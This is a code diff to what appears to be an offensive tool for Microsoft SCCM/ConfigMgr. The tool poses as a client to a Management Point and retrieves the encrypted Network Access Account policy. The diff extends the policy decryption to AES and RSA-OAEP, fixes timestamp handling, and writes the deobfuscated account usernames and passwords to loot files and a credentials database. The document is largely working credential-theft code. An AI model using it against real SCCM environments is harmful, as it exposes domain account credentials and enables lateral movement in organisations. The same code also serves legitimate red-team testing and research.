@@ -9,7 +9,7 @@ from pyasn1.codec.der.decoder import decode
 from pyasn1_modules import rfc5652
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
+from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15, OAEP, MGF1
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes, serialization
@@ -36,7 +36,13 @@ dateFormat1 = "%Y-%m-%dT%H:%M:%SZ"
 dateFormat2 = "%Y%m%d%H%M%S.000000+000"
 dateFormat3 = "%m/%d/%Y %H:%M:%S"
 
-now = datetime.datetime.utcnow()
+# CMS/PKCS#7 key-transport and content-encryption algorithm OIDs seen from
+# real Management Points (legacy and modern SCCM/ConfigMgr sites).
+RSA_OAEP_OID = "1.2.840.113549.1.1.7"
+RSA_PKCS1V15_OID = "1.2.840.113549.1.1.1"
+AES_256_CBC_OID = "2.16.840.1.101.3.4.1.42"
+AES_128_CBC_OID = "2.16.840.1.101.3.4.1.2"
+DES_EDE3_CBC_OID = "1.2.840.113549.3.7"
 
 # Huge thanks to @_Mayyhem with SharpSCCM for making requesting these easy!
 registrationRequestWrapper = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"
@@ -140,14 +146,6 @@ class CryptoTools:
     @staticmethod
     def decrypt(key, data):
         print(key.decrypt(data, PKCS1v15()))
-
-    @staticmethod
-    def decrypt3Des(key, encryptedKey, iv, data):
-        desKey = key.decrypt(encryptedKey, PKCS1v15())
-
-        cipher = Cipher(TripleDES(desKey), modes.CBC(iv))
-        decryptor = cipher.decryptor()
-        return decryptor.update(data) + decryptor.finalize()
 
 class SCCMTools():
 
@@ -288,14 +286,15 @@ class SCCMTools():
         }
 
         if authHeaders == True:
-          headers["ClientToken"] = "GUID:{};{};2".format(
-            clientID, 
-            now.strftime(dateFormat1)
-          )
           #for manual retrieval
           if key:
               self.key = key
-          headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
+          current_time = datetime.datetime.utcnow().strftime(dateFormat1)
+          headers["ClientToken"] = "GUID:{};{};2".format(
+            clientID,
+            current_time
+          )
+          headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, current_time).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
         r = requests.get(f"{self._serverURI}"+url, headers=headers)
         if retcontent == True:
           return r.content
@@ -321,12 +320,13 @@ class SCCMTools():
 
     def sendRegistration(self, name, fqname, username, password, isauthenticated=True, policies=True):
         b = self.cert.public_bytes(serialization.Encoding.DER).hex().upper()
+        current_time = datetime.datetime.utcnow().strftime(dateFormat1)
 
         embedded = registrationRequest.format(
-          date=now.strftime(dateFormat1), 
-          encryption=b, 
-          signature=b, 
-          client=name, 
+          date=current_time,
+          encryption=b,
+          signature=b,
+          client=name,
           clientfqdn=fqname
         )
 
@@ -334,9 +334,9 @@ class SCCMTools():
         request = Tools.encode_unicode(registrationRequestWrapper.format(data=embedded, signature=signature)) + "\r\n".encode('ascii')
 
         header = msgHeader.format(
-          bodylength=len(request)-2, 
-          client=name, 
-          date=now.strftime(dateFormat1), 
+          bodylength=len(request)-2,
+          client=name,
+          date=current_time,
           sccmserver=self._server
         )
 
@@ -370,14 +370,14 @@ class SCCMTools():
         payloadSignature = CryptoTools.sign(self.key, bodyCompressed).hex().upper()
 
         header = msgHeaderPolicy.format(
-          bodylength=len(body)-2, 
-          sccmserver=self._server, 
-          client=name, 
-          publickey=public_key, 
-          clientIDsignature=clientIDSignature, 
-          payloadsignature=payloadSignature, 
-          clientid=uuid, 
-          date=now.strftime(dateFormat1)
+          bodylength=len(body)-2,
+          sccmserver=self._server,
+          client=name,
+          publickey=public_key,
+          clientIDsignature=clientIDSignature,
+          payloadsignature=payloadSignature,
+          clientid=uuid,
+          date=datetime.datetime.utcnow().strftime(dateFormat1)
         )
 
         data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')
@@ -393,11 +393,51 @@ class SCCMTools():
         # Man.. asn1 suxx!
         content, rest = decode(result, asn1Spec=rfc5652.ContentInfo())
         content, rest = decode(content.getComponentByName('content'), asn1Spec=rfc5652.EnvelopedData())
-        encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
+        ktri = content['recipientInfos'][0]['ktri']
+        encryptedRSAKey = ktri['encryptedKey'].asOctets()
+        kt_algo_oid = str(ktri['keyEncryptionAlgorithm']['algorithm'])
+        algo_oid = str(content['encryptedContentInfo']['contentEncryptionAlgorithm']['algorithm'])
         iv = content['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
         body = content['encryptedContentInfo']['encryptedContent'].asOctets()
+        logger.debug(f"[*] Key transport: {kt_algo_oid}, Content encryption: {algo_oid}")
 
-        decrypted = CryptoTools.decrypt3Des(self.key, encryptedRSAKey, iv, body)
+        # Determine RSA padding from key transport algorithm
+        if kt_algo_oid == RSA_OAEP_OID:
+            if ktri['keyEncryptionAlgorithm']['parameters'].hasValue():
+                # RSAES-OAEP-params can specify a non-default hash/MGF, which
+                # we don't parse -- only the common SHA-1 default is handled.
+                logger.debug(
+                    "[*] Key transport algorithm carries explicit OAEP parameters; "
+                    "assuming SHA-1 defaults, decryption may fail if they differ"
+                )
+            desKey = self.key.decrypt(encryptedRSAKey, OAEP(mgf=MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None))
+        elif kt_algo_oid == RSA_PKCS1V15_OID:
+            desKey = self.key.decrypt(encryptedRSAKey, PKCS1v15())
+        else:
+            raise ValueError(f"Unsupported key transport algorithm OID: {kt_algo_oid}")
+
+        logger.debug(f"[*] Decrypted symmetric key: {len(desKey)} bytes ({len(desKey)*8}-bit)")
+
+        # Determine content encryption algorithm
+        if algo_oid in (AES_256_CBC_OID, AES_128_CBC_OID):
+            cipher = Cipher(algorithms.AES(desKey), modes.CBC(iv))
+            block_bits = 128
+        elif algo_oid == DES_EDE3_CBC_OID:
+            cipher = Cipher(TripleDES(desKey), modes.CBC(iv))
+            block_bits = 64
+        else:
+            raise ValueError(f"Unsupported content encryption algorithm OID: {algo_oid}")
+
+        decryptor = cipher.decryptor()
+        decrypted = decryptor.update(body) + decryptor.finalize()
+        try:
+            unpadder = padding.PKCS7(block_bits).unpadder()
+            decrypted = unpadder.update(decrypted) + unpadder.finalize()
+        except ValueError as e:
+            # Malformed/absent padding shouldn't be fatal -- fall back to the
+            # raw decrypted bytes rather than losing a policy we could
+            # otherwise still read.
+            logger.debug(f"[-] Decrypted content had no valid PKCS7 padding, using as-is: {e}")
         policy = decrypted.decode('utf-16')
         return policy
     
@@ -511,12 +551,12 @@ class SCCMTools():
 
 
     def parse_xml(self, xml_file):
+        creds = []
         try:
-            #might need to update this if the weird extra character isn't consistent from the file write
-
+            # Defensive: ignore anything after the closing tag in case the
+            # decrypted content still has trailing bytes for some reason.
             index = xml_file.find("</Policy>")
-            if index != -1:
-                clean = xml_file[:index + len("</Policy>")]
+            clean = xml_file[:index + len("</Policy>")] if index != -1 else xml_file
 
             i = ET.fromstring(clean)
             for instance in i.findall(".//instance[@class='CCM_NetworkAccessAccount']"):
@@ -525,27 +565,30 @@ class SCCMTools():
                 clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
                 clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
                 logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
+                creds.append(f"{clear_user}:{clear_pass}")
                 self.write_to_db(clear_user, clear_pass)
-            #Tools.write_to_csv(cred_dict, self.logs_dir)
 
-        except ET.ParseError as e:
-            print(f"An error occurred while parsing the XML: {e}")
         except Exception as e:
-            print(e)
+            logger.info(f"[-] An error occurred while parsing the XML: {e}")
+        return creds
         # cursor.execute(f'''insert into SiteServers (Hostname, SiteCode, SigningStatus, SiteServer, Active, Passive, MSSQL) values (?,?,?,?,?,?,?)''',
         #                 (result, '', '', 'True', '', '', '')) 
 
     def write_to_db(self, username, password):
         source = "HTTP NAA"
         database = f"{self.logs_dir}/db/find.db"
-        conn = sqlite3.connect(database, check_same_thread=False)
-        cursor = conn.cursor()
-        check = "select * from Creds where Username = ?"
-        cursor.execute(check, (username,))
-        exists = cursor.fetchone()
-        if not exists:
-            cursor.execute(f'''insert into Creds (Username, Password, Source) values (?,?,?)''', (username, password, source))
-            conn.commit()
+        try:
+            conn = sqlite3.connect(database, check_same_thread=False)
+            cursor = conn.cursor()
+            cursor.execute('''CREATE TABLE IF NOT EXISTS Creds (Username, Password, Source)''')
+            check = "select * from Creds where Username = ?"
+            cursor.execute(check, (username,))
+            exists = cursor.fetchone()
+            if not exists:
+                cursor.execute(f'''insert into Creds (Username, Password, Source) values (?,?,?)''', (username, password, source))
+                conn.commit()
+        except Exception as e:
+            logger.warning(f"[-] Could not write NAA credential to database: {e}")
         return
     
     
@@ -579,13 +622,17 @@ class SCCMTools():
                 try:
                     result = self.requestPolicy(url, uuid, True, True)
                     decryptedResult = self.parseEncryptedPolicy(result)
-                    self.parse_xml(decryptedResult)
+                    creds = self.parse_xml(decryptedResult)
                     file_name = f"{self.logs_dir}/loot/naapolicy.xml"
                     Tools.write_to_file(decryptedResult, file_name)
-                    logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/naapolicy.xml")
+                    logger.info(f"[+] Decrypted policy dumped to {file_name}")
+                    if creds:
+                        creds_file = f"{self.logs_dir}/loot/naacreds.txt"
+                        Tools.write_to_file("\n".join(creds) + "\n", creds_file)
+                        logger.info(f"[+] Deobfuscated NAA credentials saved to {creds_file}")
                     return True
-                except:
-                    logger.info(f"[-] Something went wrong.")
+                except Exception as e:
+                    logger.info(f"[-] Something went wrong: {e}")
         return False
                 
         
